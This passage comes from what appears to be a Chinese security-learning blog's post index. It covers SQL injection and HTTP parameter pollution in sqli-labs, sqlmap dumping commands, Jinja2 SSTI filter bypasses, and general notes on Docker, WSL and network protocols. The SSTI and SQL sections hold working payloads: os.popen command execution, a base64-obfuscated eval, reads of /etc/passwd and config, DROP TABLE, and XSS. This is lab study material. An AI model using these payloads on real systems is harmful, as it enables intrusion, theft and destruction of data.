users;--+?id=1;DELETE FROM WhiteMoon;--+?id=1;DROP TABLE WhiteMoon;--+","tags":["漏洞","SQL","CTF","靶场"],"categories":["CTF","靶场"]},{"title":"HTTP参数污染","path":"/2025/07/21/HTTP参数污染/","content":"HTTP参数污染 在刷sqli-labs 29时遇到了http参数污染，就想着趁火打劫来学习一下 HTTP Parameter Pollution，简称HPP，是一种注入型漏洞，如果Web应用中存在这样的漏洞，可以被攻击者利用来进行客户端或者服务器端的攻击，通过 HPP 参数污染可以实现绕过 waf 来进行攻击 漏洞原理 浏览器与服务器进行交互时，浏览器提交 GET/POST 请求参数，这些参数会以 “名称-值对” 的形式出现。通常在一个请求中，同样名称的参数只会出现一次，但是在 HTTP 协议中是允许同样名称的参数出现多次的 但不同服务器处理方式会不一样 如Goole和Bing的例子： Goole将两次输入的参数值进行拼接（未覆盖） Bing将第二次输入覆盖第一次输入 覆盖方式 WAF绕过 HPP其实严格意义上讲并不属于一种漏洞，它是利用了不同服务器对于参数获取的结果不同而导致了可以利用某些漏洞。HPP的特性让它在 WAF 绕过、逻辑漏洞挖掘上具有奇效 SQL绕过 如： ?id=1id=-1 union select 1,2,database()?id=-1id=%20union%20id=select%201,2id=,database() XSS绕过（待） 文件上传（待） 逻辑漏洞 HPP 参数污染在逻辑漏洞挖掘中也是一个大杀器 任意URL跳转 https://www.example.com?u=https://hackun.com ，由于后端做了限制，当我们把u 改成别的不同源的域名(如https://ikunmma.com)时会报错，但是我们可以利用HPP，将请求地址变成https://www.example.com?u=https://hackun.comu=https://ikunmma.com 时，由于服务器逻辑错误 使用第一个u做校验参数，而第二个u参数做跳转目的地址。于是这样便可成功绕过限制，形成任意 URL 跳转 任意密码重置（短信爆破） 一般重置密码的时候，会发送短信到用户手机 比如GET/POST传递的参数为：phone=13888888888 我们一般会去想，能不能发送验证码到自己的手机，于是可以构造成： phone=13888888888,12345678901 或者 phone=13888888888;12345678901 或者 phone=13888888888,12345678901 等等一些情况，有时候能通过，但是有些时候会出现 号码不合法 的情况，此时便可以考虑利用 HPP —— phone=13888888888phone=12345678901，如果恰好服务器用第一个号码验证是否存在该用户，而使用第二个号码发送短信时，我们便可以接管该用户 防御 设备层面，让WAF或其他网关设备（比如IPS）在检查URL时，对同一个参数被多次赋值的情况进行特殊处理。由于HTTP协议允许相同参数在URL中多次出现，因此这种特殊处理需要注意避免误杀的情况； 代码层面，编写WEB程序时，要通过合理的$_GET方法获取URL中的参数值，而尝试获取 Web服务器返回给程序的其他值时要慎重处理，结合其他漏洞的产生进行组合排查 例题 sqli-labs 29 单引号闭合，http参数污染 这里应该是我的靶场出了点问题，竟然没过滤（都是Protected By The World’s Best Firewall，但是可以正常查询） 去看了题目的源码，发现还有login.php和hacked.php代码 只能手动进入login.php 测试了下单引号双引号闭合，都跳转到hacked.php 看了下login.php： WAF白名单函数whitelist($input) //WAF implimentation with a whitelist approach..... only allows input to be Numeric.function whitelist($input) $match = preg_match(/^\\d+$/, $input); if($match) //echo you are good; //return $match; else header(Location: hacked.php); //echo you are bad; 其中： $match = preg_match(/^\\d+$/, $input); /^\\d+$/ 的含义： ^：字符串开头 \\d+：至少一个数字 $：字符串结尾 整个正则要求 输入必须是全数字组成 header(Location: hacked.php) 重定向到hacked.php HTTP 参数污染（HPP） 行为模拟 java_implimentation($query_string) // The function below immitates the behavior of parameters when subject to HPP (HTTP Parameter Pollution).function java_implimentation($query_string) $q_s = $query_string; $qs_array= explode(,$q_s); foreach($qs_array as $key = $value) $val=substr($value,0,2); if($val==id) $id_value=substr($value,3,30); return $id_value; echo br; break; 该方法将 GET 读入的整行参数使用 explode() 方法对 “” 进行分割，返回一个分割后的数组。接着方法通过 substr() 方法提取对 “” 分割后的第一个元素的前 2 个字符，若这 2 个字符是 “id”，则再次使用 substr() 方法提取等号后面的值返回。注意该方法提取的是 2 个同名变量中的第一个，因此它无法对第二个同名变量进行操作 搭建在apache服务器上的php服务对于传入多个相同名字的参数，服务器只解析最后一个，由于注入 2 个同名参数时，java_implimentation() 方法返回的参数是第一个 id 参数，此时这个过滤就被我们绕过了，所以$_GET['id']变量实际上是最后一个id参数 总结： 1.全数字输入才能绕过WAF 2.我们可以通过注入两个同名的参数 id，第一个参数用于绕过 WAF，第二个参数用于注入 payload： ?id=1id=-1union select 1,2,3--+ 参考： HTTP参数污染学习 Bypass WAF之HTTP参数污染(HPP)漏洞挖掘","tags":["漏洞","HTTP"],"categories":["漏洞","HTTP"]},{"title":"初探Docker","path":"/2025/07/17/初探Docker/","content":"年少不知docker难，初学已是docker人 初探Docker docker官方安装网站 汉化 下载对应版本中文语言包： DockerDesktop-CN 找到docker安装目录，备份并替换asar文件 \\Docker\\Docker\\frontend\\resources 重启软件后即可出现汉化界面 构造镜像时报错处理 ERROR [internal] load metadata for docker.io 这里采用更换镜像源的方法 在Docker 引擎中json文件加入： registry-mirrors: [ https://docker.registry.cyou/, https://docker-cf.registry.cyou/, https://dockercf.jsdelivr.fyi/, https://docker.jsdelivr.fyi/, https://dockertest.jsdelivr.fyi/, https://mirror.aliyuncs.com/, https://dockerproxy.com/, https://mirror.baidubce.com/, https://docker.m.daocloud.io/, https://docker.nju.edu.cn/, https://docker.mirrors.sjtug.sjtu.edu.cn/, https://docker.mirrors.ustc.edu.cn/, https://mirror.iscas.ac.cn/, https://docker.rainbond.cc/, https://jq794zz5.mirror.aliyuncs.com ] 再用docker info命令查看是否生效","tags":["Docker"],"categories":["Docker"]},{"title":"sqlmap自动注入","path":"/2025/07/16/sqlmap自动注入/","content":"sqlmap自动注入 常用参数 -u：扫描目标url --batch：自动处理提示信息 --cookie：附加cookie参数 获取当前数据库名： --current-db：查询当前web使用的数据库名 -D：应用指定数据库 获取表名： --tables：查询指定库下所有表名（先用-D指定库名） -T：应用指定表 获取字段： --columns：查询指定表下所有字段（先用-T指定名） -C：应用指定字段名 获取数据：--dump GET传参注入 基本的SQL注入检测,可以检测注入点以及可注入类型python sqlmap.py -u http://127.0.0.1:8900/Less-7/?id=1 --batch查看所有数据库python sqlmap.py -u http://127.0.0.1:8900/Less-7/?id=1 --batch --dbs查看当前使用的数据库python sqlmap.py -u http://127.0.0.1:8900/Less-7/?id=1 --batch --current-db查看表名python sqlmap.py -u http://127.0.0.1:8900/Less-7/?id=1 --batch -D security --tables查看表中的字段python sqlmap.py -u http://127.0.0.1:8900/Less-7/?id=1 --batch -D security -T users --columns查看字段中的数据python sqlmap.py -u http://127.0.0.1:8900/Less-7/?id=1 --batch -D security -T users -C id,username,password --dump POST传参注入 先用Bp抓包，然后保存抓取的内容到文件之中（我是保存在C:/Users/ASUS/Desktop/1.txt） 之后直接用sqlmap -r：指定文件路径,从指定文件中读取HTTP请求 -p ：指定参数名 ，不加p参数会自动检测注入点,也可以得到结果,指定注入参数名的话执行速度更快 基本的SQL注入检测,可以检测注入点以及可注入类型python sqlmap.py -r C:/Users/ASUS/Desktop/1.txt --batch -p passwd查看当前数据库python sqlmap.py -r C:/Users/ASUS/Desktop/1.txt --batch -p passwd --current-db查表python sqlmap.py -r C:/Users/ASUS/Desktop/1.txt --batch -p passwd -D security --tables查字段python sqlmap.py -r C:/Users/ASUS/Desktop/1.txt --batch -p passwd -D security -T users --columns查数据python sqlmap.py -r C:/Users/ASUS/Desktop/1.txt --batch -p passwd -D security -T users -C username,id,password --dump 风险和测试等级 risk（风险等级） 默认为1（范围：1~3） risk 越高，sqlmap 会尝试更具风险性的 SQL 注入技术（如 OR-based 注入、堆叠查询等） risk=3 可能导致数据被修改或删除，谨慎使用 level（测试等级） 默认为1（范围：1~5） level 越高，sqlmap 会测试更多的参数（如 User-Agent、Referer、Cookie）和更复杂的 payload level=1（默认）：仅测试 GET 和 POST 参数。 level=2：增加 Cookie 头测试。 level=3：增加 User-Agent 和 Referer 测试。 level=4：测试所有 HTTP 头（如 X-Forwarded-For）。 level=5：测试所有可能的注入点（包括 Host 头）","tags":["CTF工具","SQL","sqlmap"],"categories":["CTF工具","sqlmap"]},{"title":"DiskGenius无损调整分区大小","path":"/2025/07/15/DiskGenius无损调整分区大小/","content":"DiskGenius无损调整分区大小 DiskGenius官网下载 由于C盘爆红，我决定将无用的盘的空间扩充给C盘 1.选中要调整大小的分区，然后点击鼠标右键，在弹出的菜单中，选择“调整分区大小”菜单项 但在这边我遇到一个问题：无法点击调整分区大小 原因在于Windows11默认采用BitLocker加密 我们打开设置中的隐私与安全中的设备加密，关掉设备加密 之后就可以正常调整分区大小 要想将某分区的大小扩大，通常还要同时将另一个分区的大小缩小。要想将某个分区的大小缩小，则通常还要同时将另一个分区的大小扩大 在使用DiskGenius进行分区调整时，应该选择需要被调整小的分区 软件弹出“调整分区容量”对话框，可以设置各个分区大小调整选项 拖拽分区前部或后部，设置需要调整的分区大小，然后在下拉框选择如何处理这部分磁盘空间 分区前部的空间为要给其他盘的空间，自行分配（上述为F盘要给C盘797.74MB的空间） 3.点击“开始”按钮，DiskGenius会先显示一个提示窗口，显示本次无损分区调整的操作步骤以及一些注意事项 之后就会重启电脑自动操作（注意不要动电脑，否则会直接退出操作，又得重来） 完成之后就会发现C盘敞亮多了","tags":["Windows"],"categories":["Windows"]},{"title":"记一次简单的kali网络问题","path":"/2025/07/15/记一次简单的kali网络问题/","content":"记一次简单的kali网络问题 kali虚拟机连不上网时可以尝试以下方法重置网络连接 首先在终端输入ifconfig，只输出以下语句 说明未与主机建立联系，我们尝试用sudo dhclient -v重置网络连接 再输入ifconfig，输出以下内容代表网络连接成功（再进一步连接的话开tun模式）","tags":["虚拟机","kali"],"categories":["kali"]},{"title":"WSL装配Ubuntu","path":"/2025/07/14/WSL 装配Ubuntu/","content":"WSL 装配Ubuntu 官方安装WSL文档 wsl（Windows Subsystem for Linux）即适用于Windows的Linux子系统 开启Windows功能 在控制面板中搜索程序，点击启用或关闭Windows功能 划到底部，勾选适用于Linux的Windows子系统和虚拟机平台 安装wsl2 管理员运行命令窗口，执行更新命令 wsl --update 执行安装命令 wsl --install 设置默认版本为wsl2 wsl --set-default-version 2 重启一下电脑 安装Ubuntu 在Microsoft store中安装Ubuntu，这里我选择24.04.1LTS版本，安装后打开即可 但是这里我打开之后遇到错误（据说是天选电脑的问题） 出现了： Installing, this may take a few minutes... WslRegisterDistribution failed with error: 0x80370114 Error: 0x80370114 ?????????????????? WslRegisterDistribution failed 错误通常是由于 WSL在安装或启动 Linux 发行版时出现问题 这里我捣鼓了好久，终于找到一个解决方法： 以管理员身份运行PowerShell 输入： Enable-WindowsOptionalFeature -Online -FeatureName Microsoft-Windows-Subsystem-Linux 之后重启电脑后打开Ubuntu，会设置用户名和密码 之后要使用直接在终端输入 wsl ~","tags":["虚拟机","WSL"],"categories":["WSL"]},{"title":"网络协议","path":"/2025/07/11/网络协议/","content":"网络协议 概述 定义 网络协议是计算机网络的核心，它定义了设备之间如何通信，确保数据能够正确、高效、安全地传输。无论是浏览网页、发送邮件还是视频通话，背后都离不开网络协议的支持 大白话：网络协议是设备间“交流的语言” 分层结构 网络协议通常按照分层模型组织，最常见的模型是 OSI七层模型 和 TCP/IP四层模型 OSI七层模型 物理层（Physical Layer）: 负责传输原始比特流（如电缆、光纤、无线电波） 数据链路层（Data Link Layer）: 负责将数据封装成帧，并在同一网络中传输（如以太网协议） 网络层（Network Layer）: 负责数据包的路由和寻址（如IP协议） 传输层（Transport Layer）: 负责端到端的可靠传输（如TCP、UDP协议） 会话层（Session Layer）: 负责建立、管理和终止会话（如RPC协议） 表示层（Presentation Layer）: 负责数据的格式化和加密（如SSL/TLS协议） 应用层（Application Layer）: 负责提供用户接口和应用程序服务（如HTTP、FTP协议） TCP/IP四层模型 网络接口层（Network Interface Layer）: 对应OSI的物理层和数据链路层 网络层（Internet Layer）: 对应OSI的网络层（如IP协议） 传输层（Transport Layer）: 对应OSI的传输层（如TCP、UDP协议） 应用层（Application Layer）: 对应OSI的应用层、表示层和会话层（如HTTP、DNS协议） 网络通信基础 数据包、帧、报文 在网络通信中，数据被分割成小块进行传输，这些小块被称为数据包、帧或报文，具体名称取决于所在的网络层次 数据包（Packet）: 在网络层（如IP协议）中，数据被封装成数据包，包含源地址、目标地址和数据内容 帧（Frame）: 在数据链路层（如以太网协议）中，数据包被进一步封装成帧，包含MAC地址和错误检测信息 报文（Message）: 在应用层（如HTTP协议）中，数据以报文的形式传输，包含请求或响应的具体内容 网络地址 IP地址（Internet Protocol Address） 用于标识网络中的设备，分为IPv4（如 192.168.1.1）和IPv6（如 2001:0db8:85a3::8a2e:0370:7334） MAC地址（Media Access Control Address） 用于标识网络接口卡（NIC），是一个唯一的硬件地址，格式为 00:1A:2B:3C:4D:5E [!CAUTION] IP地址相当于家庭住址（可变） MAC地址相当于身份证号码（固定） 端口号与套接字 端口号（Port Number） 用于标识设备上的具体应用程序或服务，范围是 0 到 65535 常见端口号： HTTP: 80 HTTPS: 443 FTP: 21 SSH: 22 DNS: 53 套接字（Socket） 套接字是网络通信的端点，由IP地址和端口号组成（如 192.168.1.1:80） 套接字用于建立连接、发送和接收数据 大白话：Socket 是让两个程序通过网络“说话”的工具 网络设备 网络通信依赖于多种设备来实现数据的传输和路由 路由器（Router）: 负责在不同网络之间转发数据包，基于IP地址进行路由选择 交换机（Switch）: 负责在同一网络内转发数据帧，基于MAC地址进行数据交换 网关（Gateway）: 连接不同协议或网络，实现数据格式的转换 调制解调器（Modem）: 将数字信号转换为模拟信号（如通过电话线传输） 网络拓扑结构 网络拓扑结构描述了设备之间的连接方式 星型拓扑（Star Topology） 所有设备连接到一个中心节点（如交换机） 优点：易于管理和扩展 缺点：中心节点故障会导致整个网络瘫痪 总线型拓扑（Bus Topology） 所有设备连接到一条主干线 优点：成本低 缺点：主干线故障会影响整个网络 环型拓扑（Ring Topology） 设备连接成一个环形 优点：数据传输效率高 缺点：单点故障会影响整个网络 网状拓扑（Mesh Topology） 设备之间有多条连接路径 优点：可靠性高 缺点：成本高，管理复杂 数据传输方式 单播（Unicast）: 数据从一台设备发送到另一台设备 广播（Broadcast）: 数据发送到网络中的所有设备 组播（Multicast）: 数据发送到一组特定的设备 网络通信基本流程 数据封装 应用层生成数据报文 传输层添加端口号（TCP/UDP） 网络层添加IP地址（IP） 数据链路层添加MAC地址（帧） 物理层将数据转换为比特流 数据传输 ​\t数据通过物理介质（如电缆、光纤）传输 数据解封装 ​\t接收设备逐层解析数据，最终将数据传递给目标应用程序 常见网络通信工具 Ping: 测试设备之间的连通性 Traceroute: 跟踪数据包的传输路径 Wireshark: 抓取和分析网络数据包 Netstat: 查看网络连接状态 [!IMPORTANT] Netstat命令在Windows中应用为例 命令 说明 netstat -a 显示所有连接和监听端口 netstat -n 以数字方式显示地址和端口（不解析域名） netstat -o（Windows） 显示每个连接对应的 进程ID（PID） netstat -an 同时显示数字形式和全部连接 netstat -ano（Windows） 最常用！显示所有连接+端口+PID netstat -s 显示网络协议统计信息（如 TCP/UDP 收发统计） netstat -r 显示路由表（等价于 route print） `netstat -an findstr ESTABLISHED ` `netstat -ano findstr :8080` `tasklist findstr 1234` 协议 FTP协议 FTP（File Transfer Protocol，文件传输协议）是一种用于在网络上传输文件的协议，其允许用户从一台计算机（客户端）向另一台计算机（服务器）上传或下载文件 默认端口21 SSH协议 SSH（Secure Shell，安全外壳协议）是一种用于安全远程登录和其他网络服务的加密协议 SSH 通过加密通信来保护数据在传输过程中的安全性，广泛应用于系统管理、文件传输和远程命令执行等场景 默认端口22 Telnet协议 Telnet 是一种用于远程登录的网络协议，允许用户通过网络连接到远程计算机并在其上执行命令，其是SSH协议的前身 默认端口23 TCP协议 TCP（Transmission Control Protocol，传输控制协议）是互联网协议套件中的核心协议之一，位于传输层。它提供了一种可靠的、面向连接的、基于字节流的数据传输服务。TCP 的主要特点是确保数据在传输过程中不丢失、不重复，并且按顺序到达 SMTP协议 SMTP（Simple Mail Transfer Protocol，简单邮件传输协议）是一种用于发送电子邮件的网络协议，负责将邮件从发送方传递到接收方的邮件服务器 默认端口25 DNS协议 DNS（Domain Name System，域名系统）是互联网中用于将域名（如 www.example.com）转换为 IP 地址（如 93.184.216.34）的分布式系统 DNS 相当于互联网的电话簿，使得用户可以通过易记的域名访问网络资源，而无需记住复杂的 IP 地址 默认端口53 HTTP协议 HTTP（HyperText Transfer Protocol，超文本传输协议）是互联网上应用最广泛的协议之一，用于在客户端（如浏览器）和服务器之间传输超文本（如网页） HTTP 是万维网（WWW）的基础，支持网页浏览、文件下载、API 调用等应用场景 默认端口80 HTTPS协议 HTTPS（HyperText Transfer Protocol Secure，安全超文本传输协议）是 HTTP 的安全版本，通过在 HTTP 和传输层之间加入 TLS/SSL 加密层，保护数据传输的安全性和完整性 HTTPS 广泛用于保护敏感信息（如登录凭证、支付信息）的传输 默认端口443 POP3协议 POP3（Post Office Protocol version 3，邮局协议第3版）是一种用于从邮件服务器下载电子邮件的协议 POP3 允许用户通过客户端（如 Outlook、Thunderbird）从服务器获取邮件，并将邮件存储到本地设备 默认端口110 IMAP协议 IMAP（Internet Message Access Protocol，互联网邮件访问协议）是一种用于从邮件服务器访问和管理电子邮件的协议 与 POP3 不同，IMAP 允许用户在服务器上管理邮件，支持多设备同步和高级邮件操作 默认端口143 RDP协议 RDP（Remote Desktop Protocol，远程桌面协议）是由 Microsoft 开发的一种协议，用于远程访问和控制另一台计算机的桌面 RDP 允许用户通过网络在本地设备上操作远程计算机，就像坐在远程计算机前一样 默认端口3389 SFTP协议 SFTP（SSH File Transfer Protocol，SSH 文件传输协议）是一种基于 SSH（Secure Shell）的文件传输协议，用于在客户端和服务器之间安全地传输文件 默认的 SSH 端口22 UDP协议 UDP（User Datagram Protocol，用户数据报协议）是一种简单的、无连接的传输层协议，用于在网络中传输数据 与TCP不同的是，UDP不提供可靠性、顺序性和流量控制，但它具有低延迟和高效的特点，适合对实时性要求较高的应用 SSL协议 SSL（Secure Sockets Layer，安全套接层）是一种用于保护网络通信安全的协议，通过在传输层和应用层之间建立加密通道，防止数据被窃听、篡改和伪装 SSL 是 HTTPS、FTPS 等安全协议的基础，现已被更先进的 TLS（Transport Layer Security，传输层安全）协议所取代，但 SSL 仍然被广泛使用和提及 TLS协议 TLS（Transport Layer Security，传输层安全）是一种用于在网络中加密数据传输的协议，旨在保护数据的机密性、完整性和身份验证。 TLS 是 SSL（Secure Sockets Layer，安全套接层）的继任者，提供了更强的安全性和性能。TLS 是 HTTPS、SMTPS、FTPS 等安全协议的基础 ARP协议 ARP（Address Resolution Protocol，地址解析协议）是一种用于将网络层地址（如 IP 地址）解析为数据链路层地址（如 MAC 地址）的协议 RARP协议 RARP（Reverse Address Resolution Protocol，反向地址解析协议）是一种用于将数据链路层地址（如 MAC 地址）解析为网络层地址（如 IP 地址）的协议 RARP 是 ARP（Address Resolution Protocol，地址解析协议）的反向操作，主要用于无盘工作站等设备在启动时获取自己的 IP 地址 DHCP协议 DHCP（Dynamic Host Configuration Protocol，动态主机配置协议）是一种用于自动分配 IP 地址和其他网络配置信息（如子网掩码、默认网关、DNS 服务器）的协议 DHCP 简化了网络管理，允许设备在加入网络时自动获取必要的配置，而无需手动设置 MTP协议 MTP（Media Transfer Protocol，媒体传输协议）是一种用于在设备和计算机之间传输媒体文件（如照片、视频、音乐）的协议 MTP 由 Microsoft 开发，主要用于连接 Android 设备、数码相机、MP3 播放器等媒体设备与计算机 NTP协议 NTP（Network Time Protocol，网络时间协议）是一种用于同步计算机系统时间的协议 NTP 通过分层的时间服务器架构，确保网络中所有设备的时间保持一致，精度可达毫秒甚至微秒级别 NTP 是互联网上最广泛使用的时间同步协议，广泛应用于计算机网络、金融交易、科学实验等领域。 PPP协议 PPP（Point-to-Point Protocol，点对点协议）是一种用于在点对点链路上传输数据的协议。 PPP 广泛应用于拨号连接、DSL、V*N 等场景，支持多种网络层协议（如 IP、IPX）的封装和传输 ICMP协议 ICMP（Internet Control Message Protocol，互联网控制消息协议）是 TCP/IP 协议族中的一种网络层协议，用于在 IP 网络中传递控制消息和错误报告 ICMP 主要用于诊断网络问题、检测网络可达性和报告错误条件 ICMP 是网络管理和故障排除的重要工具，常见的工具如 ping 和 traceroute 都依赖于 ICMP IGMP协议 IGMP（Internet Group Management Protocol，互联网组管理协议）是一种用于管理 IP 组播组成员关系的协议 IGMP 运行在主机和与其直接相连的路由器之间，用于支持 IP 组播通信 GGP协议 GGP（Gateway-to-Gateway Protocol，网关到网关协议）是一种早期的路由协议，用于在互联网的核心路由器之间交换路由信息 GGP 是 ARPANET（现代互联网的前身）中最早使用的路由协议之一，主要用于在网关（即路由器）之间动态学习和传播路由信息 MCP协议 MCP（Model Context Protocol，模型上下文协议）是一种开放协议，旨在实现 大型语言模型（LLM） 应用与外部数据源、工具和服务之间的无缝集成，类似于网络中的 HTTP 协议或邮件中的 SMTP 协议 MCP 协议通过标准化模型与外部资源的交互方式，提升 LLM 应用的功能性、灵活性和可扩展性 参考： 菜鸟教程–网络协议","tags":["网络协议"],"categories":["计算机网络","网络协议"]},{"title":"Python SSTI基础绕过","path":"/2025/07/09/Python SSTI基础绕过/","content":"Python SSTI基础绕过 关键字绕过 拼接 .__class__ = [__cla + ss__] #可以不用加号.__class__ =|attr((__clas,s__)|join) 还可以用~进行拼接 .__class__ = [__cla~ss__]%set a=__cla %%set b=ss__%[a~b] 利用编码绕过 base64编码、Unicode编码、Hex编码等 以base64为例： ().__class__.__base__.__subclasses__()[59].__init__.__globals__[X19idWlsdGluc19f.decode(base64)][ZXZhbA==.decode(base64)](X19pbXBvcnRfXygib3MiKS5wb3BlbigibHMgLyIpLnJlYWQoKQ==.decode(base64))#等价于().__class__.__base__.__subclasses__()[59].__init__.__globals__[__builtins__][eval](__import__(os).popen(ls /).read()) 转置 .__class__ = [__ssalc__[::-1]].__class__ = [__ssalc__|reverse] 利用str内置方法 .__class__ = [__cTass__.replace(T,l)] [X19jbGFzc19f.decode(base64)] = #python2[__CLASS__.lower()]__claee__|replace(ee,ss) 字符绕过 过滤了. jinja2中除了Python中靠点获取属性，还可以用中括号 .__class__ = [__class__] 如果连中括号也过滤了的话，还有一个|attr的过滤器 .__class__ = |attr(__class__) 过滤了[] 利用__getitem__()绕过 getitem() 是python的一个魔术方法,对字典使用时,传入字符串,返回字典相应键所对应的值:当对列表使用时,传入整数返回列表对应索引的值 [117]=__getitem__(117)().__class__.__base__.__subclasses__().__getitem__(117).__init__.__globals__.__getitem__(__builtins__).__getitem__(eval)(__import__(os).popen(ls /).read()) 利用pop()绕过 pop()方法可以返回指定序列属性中的某个索引处的元素或指定字典属性中某个键对应的值，用法和上面的__getitem__()基本一样 ().__class__.__base__.__subclasses__().pop(117).__init__.__globals__.pop(__builtins__).pop(eval)(__import__(os).popen(ls /).read()) 注：最好不要用pop()，因为pop()会删除相应位置的值 利用字典读取绕过 我们知道访问字典里的值有两种方法，一种是把相应的键放入我们熟悉的方括号 [] 里来访问，另一种就是用点 . 来访问。所以，当方括号 [] 被过滤之后，我们还可以用点 . 的方式来访问 .__class__.__base__.subclasses__()[117].__init__.__globals__[__builtins__][eval](__import__(os).popen(ls /).read())=.__class__.base__.subclasses__().__getitem__(117).__init__.__globals__.builtins__.eval(__import__(os).popen(ls /).read()) 过滤了引号 利用char()绕过 ().__class__.__base__.__subclasses__()[40](/etc/passwd).read()=% set chr=().__class__.__base__.__subclasses__()[59].__init__.__globals__.__builtins__.chr%().__class__.__base__..__subclasses__()[40](chr(47)+chr(101)+chr(116)+chr(99)+chr(47)+chr(112)+chr(97)+chr(115)+chr(115)+chr(119)+chr(100)).read() 利用request对象绕过 ().__class__.base__.__subclasses__()[77].__init__.__globals__.popen(ls /).read()=().__class__.base__.__subclasses__()[77].__init__.__globals__.popen(request.args.cmd).read()cmd=ls / 如果过滤了args，可以将其中的request.args改为request.values，POST和GET两种方法传递的数据request.values都可以接收 过滤了__ 利用request绕过 ().__class__.base__.__subclasses__()[77].__init__.__globals__.popen(ls /).read()=().[request.args.class][request.args.base][request.args.subclasses]()[77][request.args.init][request.args.globals].popen(ls /).read()class=__class__bass=__base__subclasses=__subclasses__init=__init__globals=__globals__ 过滤了 利用%print(......)%绕过 .__class__.base__.__subclasses__()[77].__init__.__globals__.popen(ls /).read()=%print(.__class__.__base__.__subclasses__()[77].__init__.__globals__.popen(ls /).read())% 参考： flask SSTI学习与总结–奇安信","tags":["漏洞","SSTI"],"categories":["漏洞"]},{"title":"Python SSTI漏洞简单利用","path":"/2025/07/09/Python SSTI漏洞学习总结/","content":"Python SSTI漏洞简单利用 SSTI(Server Side Template Injection,服务器端模板注入) 服务器端使用模板(Web开发中所使用的模板引擎)，通过模板引擎对数据进行渲染，再传递给用户，就可以针对特定用户/特定参数生成相应的页面，模板引擎可以将用户界面和业务数据分离，逻辑代码和业务代码也可以因此分离，代码复用变得简单，开发效率也随之提高。我们可以类比百度搜索，搜索不同词条得到的结果页面是不同的，但页面的框架是基本不变的。 Flask初识 Flask快速使用 # 安装虚拟环境pip install virtualenv# 生成虚拟环境virtualenv venv# 激活环境./venv/Scripts/activate.bat# 安装Flaskpip install flask 测试代码： # 从flask包中导入flask和相应所需函数from flask import Flask,render_template_string# 实例化一个Flask类，其中的参数__name__可以替换为其他任意字符串app = Flask(__name__)# 定义路由 /，即当用户访问网站首页时，调用 index() 函数@app.route(/)def hello_world(): # 也可以使用render_template_string函数来返回一个字符串到页面上，即render_template_string(Hello World!) # return Hello World!if __name__ == __main__: # 启动Flask应用 app.run() 在venv下创建code目录用来存放代码，运行test.py，然后进入http://127.0.0.1:5000/，可以看到网页上显示了Hello World!，代表app启动成功 漏洞原理 存在SSTI漏洞的代码，其根源在于使用字符串格式化（如 % 或 format）将用户输入插入模板字符串中，再传递给 Jinja2 模板引擎渲染 经典漏洞写法 安全： render_template_string(h1Hello name /h1, name=user_input)# 或render_template(index.html, name=user_input) 危险： render_template_string(h1Hello %s/h1 % user_input)# 或Template(h1Hello %s/h1 % user_input).render() 经典漏洞例子 from flask import Flask, request, render_template_stringfrom jinja2 import Templateapp = Flask(__name__)@app.route(/) def index(): name = request.args.get(name, default=guest) t = html h1Hello %s/h1 /html % (name) # 将一段字符串作为模板进行渲染 return render_template_string(t)这样的代码同样存在漏洞def index(): name = request.args.get(name, default=guest) t = Template( html h1Hello %s/h1 /html % name ) # 对模板对象进行渲染 return t.render()app.run() 使用49作为参数id传入，可以看到表达式被成功执行，这就是SSTI漏洞出现的特征 不存在漏洞的代码 from flask import Flask, request, render_templateapp = Flask(__name__)@app.route(/)def index(): name = request.args.get(name, default=guest) # return render_template(index.html, name=name)app.run() 通过观察以上代码，我们可以发现漏洞出现的原因：服务器端将用户可控的输入直接拼接到模板中进行渲染，导致漏洞出现。反之，要解决该漏洞，则只需先将模板渲染，再拼接字符串。 深入到Flask渲染函数原理来讲，render和render_template_string由用户拼接，字符串不会自动转义，而render_template会对字符串计进行自动转义，因此避免了参数被作为表达式执行。 漏洞利用 利用思路 以通过SSTI进行RCE为例，基本的利用思路为： 随便找个倒霉的内置类：[]、“” 通过这个类获取到object类：base、bases、mro 通过object类获取所有子类：subclasses() 在子类列表中找到可以利用的类 直接调用类下面函数或使用该类空间下可用的其他模块的函数 魔术方法 魔术方法 作用 init 对象的初始化方法 class 返回对象所属的类 module 返回类所在的模块 mro 返回类的调用顺序，可以此找到其父类（用于找父类） base 获取类的直接父类（用于找父类） bases 获取父类的元组，按它们出现的先后排序（用于找父类） dict 返回当前类的函数、属性、全局变量等 subclasses 返回所有仍处于活动状态的引用的列表，列表按定义顺序排列（用于找子类） globals 获取函数所属空间下可使用的模块（__builtins__）、方法及变量（用于访问全局变量） import 用于导入模块，经常用于导入os模块 builtins 返回Python中的内置函数，如eval 寻找可利用的类 # 获取对象所属的类.__class__class str().__class__class tuple[].__class__class list .__class__class str# 获取父类.__class__.__base__class object.__class__.__bases__(class object,).__class__.__mro__(class str, class object)# 获取子类.__class__.__base__.__subclasses__().__class__.__bases__[0].__subclasses__().__class__.__mro__[-1].__subclasses__() 写个脚本跑一下，看看哪个类可以用 import re# 将查找到的子类列表替换到data中data = r [class type, class weakref, ......]# 在这里添加可以利用的类，下面会介绍这些类的利用方法userful_class = [linecache, os._wrap_close, subprocess.Popen, warnings.catch_warnings, _frozen_importlib._ModuleLock, _frozen_importlib._DummyModuleLock, _frozen_importlib._ModuleLockManager, _frozen_importlib.ModuleSpec]pattern = re.compile(r(.*?))class_list = re.findall(pattern, data)for c in class_list: for i in userful_class: if i in c: print(str(class_list.index(c)) + : + c) 构造payload 构造payload，可以获取配置文件、XSS、进行RCE（反弹shell也行）或者文件读写： 获取配置信息 # 获取配置信息config # 能获取到config，它包含了如数据库链接字符串、连接到第三方的凭证、SECRET_KEY等敏感信息request.environ # 服务器环境信息 XSS # XSSname=scriptalert(/YouAreHacked/)/script RCE 常用：#利用config配置信息直接调用os模块（好用）config.__class__.__init__.__globals__[os].popen(env).read()#用os模块中listdir列目录（常用于popen被过滤）config.__class__.__init__.__globals__[os].listdir(/)#读取文件（通常读取源码来获得waf）config.__class__.__init__.__globals__[__builtins__].open(app.py).read()# 利用warnings.catch_warnings配合__builtins__得到eval函数，直接梭哈（常用）.__class__.__base__.__subclasses__()[166].__init__.__globals__[__builtins__][eval](__import__(os).popen(env).read())# 读取文件.__class__.__base__.__subclasses__()[80].__init__.__globals__[__builtins__].open(flag.txt).read()#只有文件读取功能.__class__.__base__.__subclasses__()[80](/etc/passwd).read()# 利用os._wrap_close类所属空间下可用的popen函数进行RCE的payload.__class__.__base__.__subclasses__()[128].__init__.__globals__.popen(whoami).read().__class__.__base__.__subclasses__()[117].__init__.__globals__[popen](whoami).read()#利用模板语句% for c in [].__class__.__base__.__subclasses__() %% if c.__name__ == catch_warnings %% for b in 